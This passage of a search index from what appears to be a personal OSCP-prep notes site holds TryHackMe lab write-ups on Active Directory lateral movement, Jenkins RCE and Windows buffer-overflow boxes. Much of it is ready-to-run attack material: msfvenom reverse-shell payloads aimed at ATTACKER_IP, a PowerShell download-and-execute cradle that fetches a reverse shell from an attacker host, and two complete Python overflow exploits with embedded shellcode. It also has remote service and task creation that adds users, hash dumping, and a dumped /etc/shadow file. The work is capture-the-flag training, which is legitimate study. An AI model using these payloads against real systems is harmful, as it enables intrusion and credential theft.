cmd.exe\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#winrm","title":"WinRM","text":"<ul> <li>Port 5985, 5986</li> <li>Requires <code>Remote Management Users</code> group membership</li> </ul> <pre><code>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd\n</code></pre> <pre><code>$username = 'Administrator';\n$password = 'Mypass123';\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; \n$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n\n# interactive session\nEnter-PSSession -Computername TARGET -Credential $credential\n\n# single commands\nInvoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#sc","title":"SC","text":"<ul> <li>Port 135, 139, 445</li> <li>Requires <code>Administrators</code> group membership</li> </ul> <p>create an <code>exe-service</code> payload with <code>msfvenom</code></p> <pre><code>msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe\n</code></pre> <p>copy the binary file over using SMB</p> <pre><code>smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA.TRYHACKME.COM '//thmiis.za.tryhackme.com/admin$/'\n</code></pre> <p>set up a listener</p> <pre><code>msfconsole -q -x \"use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit\"\n</code></pre> <pre><code># Create a service\nsc.exe \\\\TARGET create THMservice binPath= \"net user munra Pass123 /add\" start= auto\n\n# Start the service\nsc.exe \\\\TARGET start THMservice\n\n# stop the service\nsc.exe \\\\TARGET stop THMservice\n\n# delete the service\nsc.exe \\\\TARGET delete THMservice\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code># Create a scheduled task\nschtasks /s TARGET /RU \"SYSTEM\" /create /tn \"THMtask1\" /tr \"&lt;command/payload to execute&gt;\" /sc ONCE /sd 01/01/1970 /st 00:00 \n\n# Run the scheduled task\nschtasks /s TARGET /run /TN \"THMtask1\" \n\n# Delete a scheduled task\nschtasks /S TARGET /TN \"THMtask1\" /DELETE /F\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Alfred/","title":"Alfred","text":"<p>Jenkins 2.190.1</p> <p>RCE can be accomplished by creating a project (too noisy) or by using the Groovy Script - this skeleton script was pulled from HackTricks (https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins)</p>"},{"location":"OSCP-Prep/TryHackMe/Alfred/#proof-of-concept","title":"Proof of concept","text":"<p> The above picture shows that RCE is possible.</p>"},{"location":"OSCP-Prep/TryHackMe/Alfred/#exploit","title":"Exploit","text":""},{"location":"OSCP-Prep/TryHackMe/Alfred/#hacktricks-said-we-can-use-this","title":"Hacktricks said we can use this:","text":"<pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');\nInvoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Alfred/#tailored-to-our-situation","title":"Tailored to our situation:","text":"<pre><code>\"powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.73.217:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.73.217 -Port 4444\".execute()\n</code></pre> <ol> <li>Attack Box<ol> <li>Host the Invoke-PowerShellTcp.ps1 file     <code>cd LOCATION_OF_PS1FILE</code> <code>python -m http.server 9000</code></li> <li>Start a nc listener on 4444      <code>nc -nvlp 4444</code></li> </ol> </li> <li>Jenkins UI: go to http://ip:port/scripts<ol> <li>Use credential admin:admin if necessary</li> <li>Paste modified script from above.</li> <li>Click Run</li> </ol> </li> </ol>"},{"location":"OSCP-Prep/TryHackMe/Alfred/#boom-we-got-shell","title":"Boom, we got shell","text":""},{"location":"OSCP-Prep/TryHackMe/Alfred/#user-flag","title":"User Flag","text":"<p> <code>79007a09481963edf2e1321abd9ae2a0</code></p> <p> <code>dff0f748678f280250f25a45b8046b4a</code></p>"},{"location":"OSCP-Prep/TryHackMe/Blueprint/","title":"Blueprint","text":"<p>This one is a windows box with minimal hints.</p>"},{"location":"OSCP-Prep/TryHackMe/Blueprint/#port-scan","title":"Port scan","text":"<pre><code>PORT      STATE    SERVICE      REASON          VERSION\n80/tcp    open     http         syn-ack ttl 125 Microsoft IIS httpd 7.5\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-title: 404 - File or directory not found.\n|_http-server-header: Microsoft-IIS/7.5\n135/tcp   open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n139/tcp   open     netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn\n443/tcp   open     ssl/http     syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n| http-methods: \n|   Supported Methods: GET HEAD POST OPTIONS TRACE\n|_  Potentially risky methods: TRACE\n|_ssl-date: TLS randomness does not represent time\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28\n| ssl-cert: Subject: commonName=localhost\n| Issuer: commonName=localhost\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2009-11-10T23:48:47\n| Not valid after:  2019-11-08T23:48:47\n| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0\n| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6\n445/tcp   open     microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n3306/tcp  open     mysql        syn-ack ttl 125 MariaDB (unauthorized)\n5172/tcp  filtered pcoip-mgmt   no-response\n7974/tcp  filtered unknown      no-response\n8080/tcp  open     http         syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28\n|_http-title: Index of /\n| http-methods: \n|   Supported Methods: GET HEAD POST OPTIONS TRACE\n|_  Potentially risky methods: TRACE\n21620/tcp filtered unknown      no-response\n32396/tcp filtered unknown      no-response\n38683/tcp filtered unknown      no-response\n46207/tcp filtered unknown      no-response\n49152/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n49153/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n49154/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n49158/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n49159/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n49160/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC\n52621/tcp filtered unknown      no-response\nAggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), Microsoft Windows 7 or 8.1 R1 (93%)\n\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Blueprint/#enumeration","title":"Enumeration","text":"<p>I went against what I normally do and headed for the webserver first. It's running some CMS I haven't heard of before <code>osCommerce Online Merchang v2.3.4</code>. The version is leaked in the webapp's URL.</p> <p>I was able to find a few exploits for this using searchsploit, I chose to test the most recent RCE exploit <code>50128.py</code></p>"},{"location":"OSCP-Prep/TryHackMe/Blueprint/#exploitation","title":"Exploitation","text":"<p>This exploit was failing out of the box because the webserver is using a self-signed cert...I just added <code>verify=False</code> to the parameter list of each <code>request.*()</code> call to bypass this. The exploit gives me an incomplete root RCE shell. I quickly jumped over to a reverse tcp shell which I generated using msfvenom.</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;myIP&gt; LPORT=4444 -f exe -o shell.exe\n</code></pre> <p>Then I used <code>certutil</code> to download the reverse shell and executed it. I now have a much more stable shell as <code>nt authority\\system</code>.</p> <p>I was able to read the root.txt file and install and run mimikatz to dump the NTLM hashes for cracking.</p> <p>Trying to crack with hashcat</p> <pre><code>hashcat -m 1000 -a 3 hash.txt\n</code></pre> <p>As I sit here reviewing scans of other boxes and listening to my computer, obviously pissed about the heavy load hashcat is putting on it....I remember using something to just lookup the hashes online in the past. A quick google brought me back to CrackStation. I was able to paste the hash and quickly look it up.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/","title":"Brainpan 1","text":""},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#recon","title":"Recon","text":"<p>The only thing I know about this challenge is there is a buffer overflow involved.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#scanning","title":"Scanning","text":"<pre><code>PORT      STATE SERVICE REASON         VERSION                                                                 \n9999/tcp  open  abyss?  syn-ack ttl 61                                                                         \n| fingerprint-strings:                                                                                         \n|   NULL: \n|     _| _| \n|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|  \n|     _|_| _| _| _| _| _| _| _| _| _| _| _|\n|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|\n|     [________________________ WELCOME TO BRAINPAN _________________________]\n|_    ENTER THE PASSWORD\n10000/tcp open  http    syn-ack ttl 61 SimpleHTTPServer 0.6 (Python 2.7.3)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: SimpleHTTP/0.6 Python/2.7.3\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#enumeration","title":"Enumeration","text":"<p>Port <code>9999</code> is some console. I did a few password guesses but nothing stuck. Port <code>10000</code> is running a webserver which has a slightly outdated infographic about secure coding. Dirbuster found a <code>/bin/</code> directory on the webserver. There's one executable file hosted there: <code>brainpan.exe</code>. This much be the service behind port 9999. I'll copy it away for exploit development in my lab. The box says to do the work in linux, but why? I already can do it repetedly in Windows. Maybe someday I'll learn the finer points of linux debuggers, but for now I'll do it the way I already know how.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#exploit-development","title":"Exploit development.","text":"<p>I got the service running in my lab and verified the port with nmap. The output for port 9999 matched the initial scan exactly!</p> <p>The buffer overflow script I wrote only identified <code>\\x00</code> as a badchar. Additionally the exploit is failing.</p> <p>The exploit was failing because of a bug in the script. Working now.</p> <p>I swapped out some variables and made the exploit ready for brainpan. Here is the final result:</p> <pre><code>#!/usr/bin/env python3\n\nimport socket\n\nip = \"10.10.109.180\"\nport = 9999\n\nprefix = \" \"\noffset = 523\noverflow = \"A\" * offset\nretn = \"\\xf3\\x12\\x17\\x31\"\npadding = \"\\x90\" * 16\n# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 EXITFUNC=thread -b \"\\x00\" -f c\npayload = \"\\xda\\xc4\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\\x52\\xbb\\xad\\xfc\\xa8\\x8e\\x31\\x58\\x17\\x83\\xe8\\xfc\\x03\\xf5\\xef\\x4a\\x7b\\xf9\\xf8\\x09\\x84\\x01\\xf9\\x6d\\x0c\\xe4\\xc8\\xad\\x6a\\x6d\\x7a\\x1e\\xf8\\x23\\x77\\xd5\\xac\\xd7\\x0c\\x9b\\x78\\xd8\\xa5\\x16\\x5f\\xd7\\x36\\x0a\\xa3\\x76\\xb5\\x51\\xf0\\x58\\x84\\x99\\x05\\x99\\xc1\\xc4\\xe4\\xcb\\x9a\\x83\\x5b\\xfb\\xaf\\xde\\x67\\x70\\xe3\\xcf\\xef\\x65\\xb4\\xee\\xde\\x38\\xce\\xa8\\xc0\\xbb\\x03\\xc1\\x48\\xa3\\x40\\xec\\x03\\x58\\xb2\\x9a\\x95\\x88\\x8a\\x63\\x39\\xf5\\x22\\x96\\x43\\x32\\x84\\x49\\x36\\x4a\\xf6\\xf4\\x41\\x89\\x84\\x22\\xc7\\x09\\x2e\\xa0\\x7f\\xf5\\xce\\x65\\x19\\x7e\\xdc\\xc2\\x6d\\xd8\\xc1\\xd5\\xa2\\x53\\xfd\\x5e\\x45\\xb3\\x77\\x24\\x62\\x17\\xd3\\xfe\\x0b\\x0e\\xb9\\x51\\x33\\x50\\x62\\x0d\\x91\\x1b\\x8f\\x5a\\xa8\\x46\\xd8\\xaf\\x81\\x78\\x18\\xb8\\x92\\x0b\\x2a\\x67\\x09\\x83\\x06\\xe0\\x97\\x54\\x68\\xdb\\x60\\xca\\x97\\xe4\\x90\\xc3\\x53\\xb0\\xc0\\x7b\\x75\\xb9\\x8a\\x7b\\x7a\\x6c\\x1c\\x2b\\xd4\\xdf\\xdd\\x9b\\x94\\x8f\\xb5\\xf1\\x1a\\xef\\xa6\\xfa\\xf0\\x98\\x4d\\x01\\x93\\xac\\x93\\x40\\xba\\xd9\\x91\\x52\\x2d\\x46\\x1f\\xb4\\x27\\x66\\x49\\x6f\\xd0\\x1f\\xd0\\xfb\\x41\\xdf\\xce\\x86\\x42\\x6b\\xfd\\x77\\x0c\\x9c\\x88\\x6b\\xf9\\x6c\\xc7\\xd1\\xac\\x73\\xfd\\x7d\\x32\\xe1\\x9a\\x7d\\x3d\\x1a\\x35\\x2a\\x6a\\xec\\x4c\\xbe\\x86\\x57\\xe7\\xdc\\x5a\\x01\\xc0\\x64\\x81\\xf2\\xcf\\x65\\x44\\x4e\\xf4\\x75\\x90\\x4f\\xb0\\x21\\x4c\\x06\\x6e\\x9f\\x2a\\xf0\\xc0\\x49\\xe5\\xaf\\x8a\\x1d\\x70\\x9c\\x0c\\x5b\\x7d\\xc9\\xfa\\x83\\xcc\\xa4\\xba\\xbc\\xe1\\x20\\x4b\\xc5\\x1f\\xd1\\xb4\\x1c\\xa4\\xf1\\x56\\xb4\\xd1\\x99\\xce\\x5d\\x58\\xc4\\xf0\\x88\\x9f\\xf1\\x72\\x38\\x60\\x06\\x6a\\x49\\x65\\x42\\x2c\\xa2\\x17\\xdb\\xd9\\xc4\\x84\\xdc\\xcb;\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n\n</code></pre> <p>I get a shell. But not a very good one. I was able to get a somewhat normal shell by executing <code>/bin/bash</code> and the python pty.spawn trick.</p> <pre><code>python3 -c \"import pty; pty.spawn('/bin/bash');\"\n</code></pre> <p>The shell was still pretty unstable and unpredictable, so I ran linpeas and downloaded the output for review.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#linpeas-findings","title":"LinPEAS findings","text":"<p>OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc  version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25  19:02:34 UTC 2013</p> <p>Sudo 1.8.5p2</p> <p>PROCESSOR_ARCHITECTURE=x86</p> <p>[1] dirty_cow       CVE-2016-5195       Source: http://www.exploit-db.com/exploits/40616  [2] exploit_x       CVE-2018-14665       Source: http://www.exploit-db.com/exploits/45697  [3] msr       CVE-2013-0268       Source: http://www.exploit-db.com/exploits/27297  [4] perf_swevent       CVE-2013-2094       Source: http://www.exploit-db.com/exploits/26131  [5] pp_key       CVE-2016-0728       Source: http://www.exploit-db.com/exploits/39277  [6] timeoutpwn       CVE-2014-0038       Source: http://www.exploit-db.com/exploits/31346</p> <p>The output is messy, but it appears cron is running and the standard crontab file has an entry that starts chksrv.sh (the script that starts brainpan.exe).</p> <p>I was investigating the crontab file to see if I could gain execution somehow. I don't have write access to crontab, or the script it calls...but wait. The brainpan executable was in my users's home directory. Maybe have write permissions to it.</p> <p>I started playing with <code>anansi_util</code> since I was able to run it as sudo. Using GTFO bins I was able to find a few different breakout methods for the manual command.</p> <p>I was able to read <code>/etc/shadow</code></p> <pre><code>Z:\\home\\puck&gt;sudo /home/anansi/bin/anansi_util manual /etc/shadowi\n\nroot:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO\u2010hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa\u2010Dioh0:15768:0:99999:7:::              \n\nreynard:$6$h54J.qxd$yL5md3J4dON\u2010wNl.36iA.mkcabQqRMmeZ0VFKxIVpX\u2010eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::\n\nanansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv\u2010Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly\u2010DGIPE1:15768:0:99999:7:::\n\npuck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm\u2010bIcBF9Oi7q2eAi0TMMqO\u2010hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Brainpan1/#m-h-dom-mon-dow-command","title":"m h  dom mon dow   command","text":"<ul> <li> <ul> <li> <ul> <li> <ul> <li> <ul> <li>/home/puck/checksrv.sh</li> </ul> </li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>User puck may run the following commands on this host:    (root) NOPASSWD: /home/anansi/bin/anansi_util</p> <p>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 .sh files in path \u255a https://book.hacktricks.xyz/linux-unix/privilege-esca lation#script-binaries-in-path /usr/bin/gettext.sh</p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/","title":"Brainstorm","text":""},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#scan","title":"Scan","text":"<p>This room is a bit challenging. The scan shows ftp (21) and some chat client (9999). I only see these two, but apparently there are 6. Must be some UDP ports I missed.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#explore-the-services","title":"Explore the services","text":""},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#ftp","title":"FTP","text":"<p>Anonymous login is allowed. I logged in with user <code>ftp</code> and pass <code>ftp</code> but kept hitting an error about Extended Passive Mode.. I did some reasearch to refresh my memory on what this was.</p> <pre><code>ftp 10.10.109.7\nConnected to 10.10.109.7.\n220 Microsoft FTP Service\nName (10.10.109.7:nate): ftp\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||49356|) \n</code></pre> <p>Long story short, you need to force active mode since passive mode is failing. I spent a lot of time googling this error and reading about how to fix it. But the answer was right in the damn man page; need to force active mode with the <code>-A</code> flag.</p> <pre><code>ftp 10.10.109.7 -A                                                      \nConnected to 10.10.109.7.                                                                                      \n220 Microsoft FTP Service\nName (10.10.109.7:nate): ftp                                                                                   \n331 Anonymous access allowed, send identity (e-mail name) as password.                                         \nPassword:                                                                                                      \n230 User logged in.                                                                                            \nRemote system type is Windows_NT.                                                                              \nftp&gt; ls                                                                                                        \n200 EPRT command successful.\n150 Opening ASCII mode data connection.\n08-29-19  07:36PM       &lt;DIR&gt;          chatserver\n226 Transfer complete.\n</code></pre> <p>Great, it's working now and I see a folder.</p> <pre><code>ftp&gt; cd chatserver\n250 CWD command successful. \nftp&gt; ls\n200 EPRT command successful.\n150 Opening ASCII mode data connection.\n08-29-19  09:26PM                43747 chatserver.exe\n08-29-19  09:27PM                30761 essfunc.dll\n226 Transfer complete.\n</code></pre> <p>Find <code>chatserver.exe</code> and download it for later.</p> <pre><code>ftp&gt; get chatserver.exe\nlocal: chatserver.exe remote: chatserver.exe\n200 EPRT command successful.\n150 Opening ASCII mode data connection.\n100% |******************************************************************| 43747       43.33 KiB/s    00:00 ETA\n226 Transfer complete.\nWARNING! 45 bare linefeeds received in ASCII mode.\nFile may not have transferred correctly.\n43747 bytes received in 00:00 (43.31 KiB/s)\n</code></pre> <p>Crap, I've ran into this before. Need to use <code>binary</code> to transfer executables.</p> <pre><code>ftp&gt; binary\n200 Type set to I.\nftp&gt; get chatserver.exe\nlocal: chatserver.exe remote: chatserver.exe\n200 EPRT command successful.\n125 Data connection already open; Transfer starting.\n100% |******************************************************************| 43747       43.87 KiB/s    00:00 ETA\n226 Transfer complete.\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#exploit-development","title":"Exploit Development","text":""},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#setting-up-the-dev-environment","title":"Setting up the Dev environment","text":""},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#setting-up-the-sandbox","title":"Setting up the sandbox","text":"<p>Now I'll set up a Windows Dev environment in Windows Sandbox (I don't want to run this executable on my PC.)</p> <p>It appears to be working. Will not have to to do anything crafty with the network.</p> <p></p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#immunity-and-python","title":"Immunity and python","text":"<p>Then install immunity, which also installs python. The python installer failed the first time around so I selected \"Install just for this user\" the second time around. Not sure if it was coincidence or lucky guess but it worked. Lets get crackin!</p> <p>Actually immunity wouldn't boot as it coulnd't find the python files. So I'm moving this project to a dev version of Windows 11 I have installed in the lab. It'll be a good first look at Windows 11 anyways. EDIT: Turns out it had nothing to do with the sandbox. It's possible this would have worked if I did all the below fixes, but everything is lost from a sandbox when the session is closed. It's probably better to use a VM anyways so I can maintain the debugging environment.</p> <p>I was able to get everything working in Windows 11. Had to configure Windows firewall to allow port 9999 though.</p> <p>Everything is working!</p> <p></p> <p>Seems like the overflow will be in the username. Lets fire up the tool.</p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#mona","title":"Mona","text":"<p>Looks like I spoke too soon about everything working. I got an error when trying to run a <code>!mona</code> command.</p> <p>pycommands: error importing module</p> <p>I see online this error is from using the 64-bit python and using a 32bit version should fix it. So...reinstall python with x86 version.</p> <p>Also, I need to install mona. Wow, setting up this environment is a PITA - it was nice having a box ready on TryHackMe for the other challenges. I'll have to save this setup.</p> <p>Another issue - since the file was downloaded from the internet, it has to be marked as safe in the file properties before it can be used.</p> <p></p> <p>Another issue I ran into was the <code>mona.py</code> file was full of HTML as I downloaded it incorrectly. Found that here on github</p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#i-never-want-to-go-through-this-again","title":"I never want to go through this again","text":"<p>IT WORKS!!!!</p> <p>Getting a snapshot...</p>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#develop-the-exploit","title":"Develop the exploit","text":"<p>I used the buffer overflow helper script I made and got this box done MUCH quicker than I was able to get the DEV environment set up.  </p> <p>I never turned off Windows AV module so I only had access for a bit before getting kicked.</p> <p></p> <p>The completed POC exploit is as follows:</p> <pre><code>#!/usr/bin/env python3\n\nimport socket\n\nip = \"192.168.1.104\"\nport = 9999\n\nprefix = \" \"\noffset = 6107\noverflow = \"A\" * offset\nretn = \"\\xdf\\x14\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = \"\\xbd\\xcf\\xbb\\xca\\x95\\xdb\\xc2\\xd9\\x74\\x24\\xf4\\x58\\x33\\xc9\\xb1\\x52\\x31\\x68\\x12\\x03\\x68\\x12\\x83\\x27\\x47\\x28\\x60\\x4b\\x50\\x2f\\x8b\\xb3\\xa1\\x50\\x05\\x56\\x90\\x50\\x71\\x13\\x83\\x60\\xf1\\x71\\x28\\x0a\\x57\\x61\\xbb\\x7e\\x70\\x86\\x0c\\x34\\xa6\\xa9\\x8d\\x65\\x9a\\xa8\\x0d\\x74\\xcf\\x0a\\x2f\\xb7\\x02\\x4b\\x68\\xaa\\xef\\x19\\x21\\xa0\\x42\\x8d\\x46\\xfc\\x5e\\x26\\x14\\x10\\xe7\\xdb\\xed\\x13\\xc6\\x4a\\x65\\x4a\\xc8\\x6d\\xaa\\xe6\\x41\\x75\\xaf\\xc3\\x18\\x0e\\x1b\\xbf\\x9a\\xc6\\x55\\x40\\x30\\x27\\x5a\\xb3\\x48\\x60\\x5d\\x2c\\x3f\\x98\\x9d\\xd1\\x38\\x5f\\xdf\\x0d\\xcc\\x7b\\x47\\xc5\\x76\\xa7\\x79\\x0a\\xe0\\x2c\\x75\\xe7\\x66\\x6a\\x9a\\xf6\\xab\\x01\\xa6\\x73\\x4a\\xc5\\x2e\\xc7\\x69\\xc1\\x6b\\x93\\x10\\x50\\xd6\\x72\\x2c\\x82\\xb9\\x2b\\x88\\xc9\\x54\\x3f\\xa1\\x90\\x30\\x8c\\x88\\x2a\\xc1\\x9a\\x9b\\x59\\xf3\\x05\\x30\\xf5\\xbf\\xce\\x9e\\x02\\xbf\\xe4\\x67\\x9c\\x3e\\x07\\x98\\xb5\\x84\\x53\\xc8\\xad\\x2d\\xdc\\x83\\x2d\\xd1\\x09\\x03\\x7d\\x7d\\xe2\\xe4\\x2d\\x3d\\x52\\x8d\\x27\\xb2\\x8d\\xad\\x48\\x18\\xa6\\x44\\xb3\\xcb\\x09\\x30\\xba\\x7b\\xe2\\x43\\xbc\\x6a\\xae\\xca\\x5a\\xe6\\x5e\\x9b\\xf5\\x9f\\xc7\\x86\\x8d\\x3e\\x07\\x1d\\xe8\\x01\\x83\\x92\\x0d\\xcf\\x64\\xde\\x1d\\xb8\\x84\\x95\\x7f\\x6f\\x9a\\x03\\x17\\xf3\\x09\\xc8\\xe7\\x7a\\x32\\x47\\xb0\\x2b\\x84\\x9e\\x54\\xc6\\xbf\\x08\\x4a\\x1b\\x59\\x72\\xce\\xc0\\x9a\\x7d\\xcf\\x85\\xa7\\x59\\xdf\\x53\\x27\\xe6\\x8b\\x0b\\x7e\\xb0\\x65\\xea\\x28\\x72\\xdf\\xa4\\x87\\xdc\\xb7\\x31\\xe4\\xde\\xc1\\x3d\\x21\\xa9\\x2d\\x8f\\x9c\\xec\\x52\\x20\\x49\\xf9\\x2b\\x5c\\xe9\\x06\\xe6\\xe4\\x09\\xe5\\x22\\x11\\xa2\\xb0\\xa7\\x98\\xaf\\x42\\x12\\xde\\xc9\\xc0\\x96\\x9f\\x2d\\xd8\\xd3\\x9a\\x6a\\x5e\\x08\\xd7\\xe3\\x0b\\x2e\\x44\\x03\\x1e;\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Brainstorm/#exploit-the-target","title":"Exploit the target","text":"<p>Now to swap out the payload (line 15) and the RHOST IP (line 5).</p> <p>Time to test the exploit.</p> <p>Nice, I got a system shell!</p> <p></p>"},{"location":"OSCP-Prep/TryHackMe/BufferOverFlowPrep/","title":"BufferOverFlowPrep","text":"<p>This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging <code>mona</code> in immunity debugger to increase speed.</p> <p>I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again.</p> <p>Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code. Only runs on linux and <code>xclip</code> required. It could easily be ported to Windows, just need to change the functions that access clipboard. </p> <p>LMK if you have any questions!</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/","title":"Gatekeeper","text":""},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#recon","title":"Recon","text":"<p>There not much for an introduction on this one. The description mentions passing through the gatekeeper and there's fire on the other side.</p>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#scanning","title":"Scanning","text":""},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#nmap","title":"NMAP","text":"<pre><code>PORT      STATE SERVICE      REASON          VERSION\n135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC\n139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n31337/tcp open  Elite?       syn-ack ttl 125\n| fingerprint-strings: \n|   GetRequest: \n|     Hello GET / HTTP/1.0\n|_    Hello\n49152/tcp open  unknown      syn-ack ttl 125\n49153/tcp open  unknown      syn-ack ttl 125\n49154/tcp open  unknown      syn-ack ttl 125\n49155/tcp open  unknown      syn-ack ttl 125\n49161/tcp open  unknown      syn-ack ttl 125\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31337-TCP:V=7.92%I=9%D=2/11%Time=62072C3C%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,24,\"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\");\nOS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (94%)\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Gatekeeper/#smbmap","title":"SMBmap","text":"<pre><code>[+] Guest session       IP: 10.10.79.126:139    Name: 10.10.79.126\n        Disk                                                    Permissions      Comment\n        ----                                                    -----------      -------\n        ADMIN$                                                  NO ACCESSRemote Admin\n        C$                                                      NO ACCESSDefault share\n        IPC$                                                    NO ACCESSRemote IPC\n        Users                                                   READ ONLY\n        